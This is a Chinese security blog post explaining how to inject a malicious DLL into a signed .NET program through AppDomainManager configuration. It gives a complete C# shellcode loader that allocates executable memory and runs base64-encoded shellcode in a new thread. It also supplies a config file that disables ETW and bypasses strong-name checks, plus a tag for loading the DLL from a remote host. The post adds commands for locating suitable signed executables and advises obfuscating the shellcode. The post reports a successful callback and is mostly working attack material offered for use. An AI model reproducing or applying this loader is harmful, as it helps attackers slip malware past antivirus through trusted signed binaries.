#  白程序？360？ApplicationDomain注入？

原创 relaysec  [ Relay学安全 ](javascript:void\(0\);)

**Relay学安全** ![]()

微信号 gh_8d57319ec39c

功能介绍
这是一个纯分享技术的公众号，只想做安全圈的一股清流，不会发任何广告，不会接受任何广告，只会分享纯技术文章，欢迎各行各业的小伙伴关注。让我们一起提升技术。

____

___发表于_

#### 简介

每个 .NET 二进制文件都包含以安全方式加载程序集的应用程序域。AppDomainManager 对象可用于在 .NET 进程内创建新的
ApplicationDomain。

那么我们就可以自定义ApplicationDomain并注入到.Net二进制文件中来运行我们的恶意代码，那么如果这个.Net二进制文件他是有签名的，那么我们在不需要破坏它的签名的情况下，直接将我们的恶意DLL注入进去即可。

那么这个DLL我们如何来编写呢？

#### 编写恶意DLL

需要注意的是我们所有的代码都需要写在InitializeNewDomain函数中。

如下模板:

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    using System;using System.EnterpriseServices;using System.Runtime.InteropServices; public sealed class MyAppDomainManager : AppDomainManager{       public override void InitializeNewDomain(AppDomainSetup appDomainInfo)    {           System.Windows.Forms.MessageBox.Show("Hello relaysec");        //执行RelaySec类中的Execute方法,Execute方法是一个静态方法 所以是可以直接调用的。        bool res = RelaySec.Execute();                 return;    }} public class RelaySec {                    [DllImport("kernel32")]    private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);                   [DllImport("kernel32")]    private static extern IntPtr CreateThread(                UInt32 lpThreadAttributes,    UInt32 dwStackSize,    IntPtr lpStartAddress,    IntPtr param,    UInt32 dwCreationFlags,    ref UInt32 lpThreadId           );    [DllImport("kernel32")]    private static extern UInt32 WaitForSingleObject(               IntPtr hHandle,    UInt32 dwMilliseconds);              public static bool Execute()    {          //这里的payload需要base64编码 所以建议是sgn编码之后放到这里即可。      byte[] installercode = System.Convert.FromBase64String("这里编写你的payload");      //申请内存      IntPtr funcAddr = VirtualAlloc(0, (UInt32)installercode.Length, 0x1000, 0x40);      //将shellcode 复制到内存中      Marshal.Copy(installercode, 0, (IntPtr)(funcAddr), installercode.Length);      IntPtr hThread = IntPtr.Zero;      UInt32 threadId = 0;      IntPtr pinfo = IntPtr.Zero;      //创建线程去执行 其实这里也可以使用回调函数去执行      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);      WaitForSingleObject(hThread, 0xFFFFFFFF);      return true;    } }

这里我们需要使用.Net4.0文件夹中的csc.exe将.Net程序编译为DLL文件。

  * 

    
    
    csc.exe /target:library /out:relaysec.dll C:\Users\Admin\Desktop\relay.cs

![]()

然后会在.Net目录中生成一个relaysec.dll文件，我们将这个文件拿出来。

定义一个配置文件，名为AddInProcess.exe.config，最后将.Net程序放到同一个目录，即可。

  *   *   *   *   *   *   *   *   *   *   * 

    
    
    <configuration>   <runtime>      <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">         <probing privatePath="."/>      </assemblyBinding>       <appDomainManagerAssembly value="relaysec, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />        <appDomainManagerType value="MyAppDomainManager" />       <etwEnable enabled="false"/>      <bypassTrustedAppStrongNames enabled="true"/>   </runtime></configuration>

![]()

![]()

然后当我们双击AddInProcess.exe的时候，会看到弹出了Hello Relaysec。

![]()

那么我们是不是也就可以直接执行shellcode了，这里将shellcode编码为base64。

  * 

    
    
    base64 dotnet.bin > dot.txt

![]()

可以看到成功上线。

![]()

并且这个dotnet程序是有签名的且是有效的。

![]()

那么我们在想这样的话我们就得往目标去上线3个文件，这样的话很麻烦，我们有没有什么其他办法只需要两个文件即可，如下。

#### 远程加载DLL

我们可以使用如下标签来远程加载: 但是是不建议的，因为这样的话就暴露了你的服务器。当然你也可以将它挂载在云上，或者公共下载的地方。

  * 

    
    
    <codeBase version="0.0.0.0" href="\\127.0.0.1:8080\relaysec.dll" />

#### 如何去挖掘DotNet

使用如下工具:

  * 

    
    
    https://github.com/0xthirteen/AssemblyHunter

使用如下命令:

  * 

    
    
    AssemblyHunter.exe path="c:\Program Files" recurse=true noreqpriv=true exeonly=true signed=true quiet=true getasmid=true getuac=true getappid=true

![]()

![]()

需要注意的是shellcode是需要混淆处理的。

预览时标签不可点

微信扫一扫  
关注该公众号

继续滑动看下一个

# 白程序？360？ApplicationDomain注入？

原创 relaysec  [ Relay学安全 ](javascript:void\(0\);)

轻触阅读原文

![]()

Relay学安全

赞 分享 在看

向上滑动看下一个

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看 分享 留言

